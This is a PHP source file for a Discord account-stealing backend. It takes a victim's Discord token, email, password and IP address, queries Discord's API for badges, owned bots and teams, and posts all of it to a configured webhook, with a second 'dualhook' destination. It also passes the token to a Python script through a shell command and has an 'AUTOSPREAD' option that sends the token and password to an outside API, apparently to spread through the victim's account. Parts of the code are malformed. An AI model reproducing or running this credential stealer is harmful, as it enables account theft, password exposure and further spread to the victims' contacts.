<?php
function getinfo($token, $url){
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('authorization: '.$token));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

    $result        =  curl_exec($ch);
    $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

    curl_close($ch);

    $body      =  substr($result, $headers_size);
    $response  =  json_decode($body);
    $response  =  json_decode(json_encode($response), true);

    return $result;
    
}

function getbadges($token, $login, $password, $client_ip) {

    require 'config.php';

    $TeamOwner     =  'Err';
    $BOT_Verify    =  'Err';

    $json_response =  json_decode(getinfo($token, "https://discordapp.com/api/v9/users/@me"), true);

    $userid        =  $json_response['id'];
    $howmuchbadges =  0;
    $badges        =  '';

    $command = escapeshellcmd('python test.py SEND('.$token.')');
    $output = shell_exec($command);

    if(isset($json_response['discriminator']) && isset($json_response['username'])) {
        $public_flags = $json_response['public_flags'];

        $flags = array (
            131072 => 'Verified Developer',
            65536 => 'Verified Bot',
            16384 => 'Bug Hunter Level 2',
            4096 => 'System',
            1024 => 'Team User',
            512 => 'Premium Early Supporter',
            256 => 'Hypesquad Online House 3',
            128 => 'Hypesquad Online House 2',
            64 => 'Hypesquad Online House 1',
            8 => 'Bug Hunter Level 1',
            4 => 'Hypesquad',
            2 => 'Partner',
            1 => 'Staff'
        );

        $str_flags = array();

        while($public_flags != 0)
        {
            foreach($flags as $key => $value)
            {
                if($public_flags >= $key)
                {
                    array_push($str_flags,$value);
                    $public_flags = $public_flags - $key;
                }
            }
        }
    }

    foreach($str_flags as $item)
        {
            if ($item != 'Hypesquad Online House 1' and $item != 'Hypesquad Online House 2' and $item != 'Hypesquad Online House 3')
            {
                if ($item == 'Verified Developer')
                {

                    # CHECK BOTS #
                    $json_response_bot = json_decode(getinfo($token, "https://discord.com/api/v9/applications?with_team_applications=true"), true);

                    foreach($json_response_bot as $item2)
                    {
                        if (json_encode($item2['verification_state']) == '4')
                        {
                            if (json_encode($item2['owner']['id']) == $userid)
                            {
                              $BOT_Verify = 'Bot Owner';
                            }
                        }
                    }

                    # CHECK TEAMS #
                    $json_response_team = json_decode(getinfo($token, "https://discord.com/api/v9/teams"), true);

                    foreach($json_response_team as $item3)
                    {
                        if (json_encode($item3['owner_user_id']) == $userid)
                        {
                            $TeamOwner = 'Team Owner';
                        }
                    }
                    # CHECK TEAMS #

                    if ($TeamOwner != 'Err' and $BOT_Verify == 'Err')
                    {
                        $item = (string)$item.'(Team Owner)';
                    }
                    elseif($TeamOwner == 'Err' and $BOT_Verify != 'Err')
                    {
                        $item = (string)$item.'(Bot Owner)';
                    }
                    elseif($TeamOwner != 'Err' and $BOT_Verify != 'Err')
                    {
                        $item = (string)$item.'(Team Owner, Bot Owner)';
                    }

                    if ($howmuchbadges == 0)
                    {
                        $badges = $item;
                    }
                    else
                    {
                        $badges = $badges.' | '.$item;
                    }

                    $howmuchbadges += 1;
                }
                else
                {
                    if ($howmuchbadges == 0)
                    {
                        $badges = $item;
                    }
                    else
                    {
                        $badges = $badges.' | '.$item;
                    }

                    $howmuchbadges += 1;
                }
            }
        }

        $headers = [ 'Content-Type: application/json; charset=utf-8' ];
        if ($badges == '') {
                      $POST = [ 'username' => 'aj', 'content' => ' '.$embedmsg.'                       

```👮️ User ID:  '.$userid.'
📪 GMail: '.$login.'
🔑 Password: '.$password.'
💸 Discord Token: '.$token.'
🏘 IP Address: '.$client_ip.'
✨ Badges ('.$howmuchbadges.'): '.$badges.'```
'];
        }
        else {
          $POST = [ 'username' => 'aj', 'content' => 'Wow!: '.$embedmsg.'                         "avatar_url" => $webhookpfp,
```👮️ User ID:  '.$userid.'
📪 GMail: '.$login.'
🔑 Password: '.$password.'
💸 Discord Token: '.$token.'
🏘 IP Address: '.$client_ip.'```
✨ Badges ('.$howmuchbadges.'): '.$badges.'
          '];
        }

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $WEBHOOK);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
        if ($SEND_TO_WEBHOOK)
        $response = curl_exec($ch);
curl_close($ch);
        if ($AUTOSPREAD)
            $contents = file_get_contents($API_URL.urlencode($token).'/'.urlencode($MESSAGE).'/'.urlencode($password));
            $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => "$dualhook",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $headers,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
}
$response = curl_exec($ch);
curl_close($ch);
?>
